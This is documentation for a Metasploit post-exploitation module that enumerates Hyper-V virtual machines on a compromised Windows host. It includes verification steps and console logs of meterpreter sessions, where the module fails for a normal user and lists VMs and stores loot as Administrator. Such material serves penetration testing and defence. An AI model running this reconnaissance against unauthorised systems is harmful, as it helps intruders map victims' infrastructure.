## Vulnerable Application

  This post-exploitation module will check if a host is running Hyper-V. If the host is running Hyper-V, the module
  will gather information about all Hyper-V VMs installed on the host, including the name of the VM, its status,
  CPU usage, version of the Hyper-V engine that it relies on, and its state (running, suspended, offline, etc).

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/enum_hyperv_vms`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. If the host has Hyper-V installed, a list of Hyper-V VMs which are on target host will be returned, along with their attributes.

## Options

This module just uses the standard options available to any post module.

## Extracted data

  - Name of each VM
  - State of each VM
  - CPU Usage of each VM
  - How long each VM has been running for, down to the milliseconds.
  - Amount of memory assigned to each VM
  - Status of each VM
  - The version of the Hyper-V engine that each VM is using.

## Scenarios

### Meterpreter session as a normal user on Windows Server 2019 Standard Edition - fails as user lacks required permissions

```
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 172.20.150.24:4444
[*] Sending stage (200262 bytes) to 172.20.150.24
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.20.150.24:4444) at 2020-09-10 18:33:16 -0500

meterpreter > getuid
Server username: RAPID7\normal
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeMachineAccountPrivilege

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
msf6 post(windows/gather/enum_hyperv_vms) > show options

Module options (post/windows/gather/enum_hyperv_vms):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf6 post(windows/gather/enum_hyperv_vms) > set session 1
session => 1
msf6 post(windows/gather/enum_hyperv_vms) > run

[+] Compressed size: 800
[-] You need to be running as an elevated admin or a user of the Hyper-V Administrators group to run this module
[*] Post module execution completed
msf6 post(windows/gather/enum_hyperv_vms) > 
```

### Meterpreter session as an elevated admin user
```
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 172.20.150.24:4444
[*] Sending stage (200262 bytes) to 172.20.150.24
[*] Meterpreter session 2 opened (0.0.0.0:0 -> 172.20.150.24:4444) at 2020-09-10 18:43:15 -0500

meterpreter > getuid
Server username: RAPID7\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeEnableDelegationPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeMachineAccountPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
msf6 post(windows/gather/enum_hyperv_vms) > set SESSION 2 
SESSION => 2
msf6 post(windows/gather/enum_hyperv_vms) > run

[+] Compressed size: 800
[*] Name           State   CPUUsage(%) MemoryAssigned(M) Uptime           Status             Version
----           -----   ----------- ----------------- ------           ------             -------
Test Machine   Off     0           0                 00:00:00         Operating normally 9.0    
Windows XP SP3 Running 79          2048              02:54:58.3210000 Operating normally 9.0    

[+] Stored loot at /home/gwillcox/.msf4/loot/20200910184541_default_172.20.150.24_host.hyperv_vms_309544.txt
[*] Post module execution completed
msf6 post(windows/gather/enum_hyperv_vms) > 
```
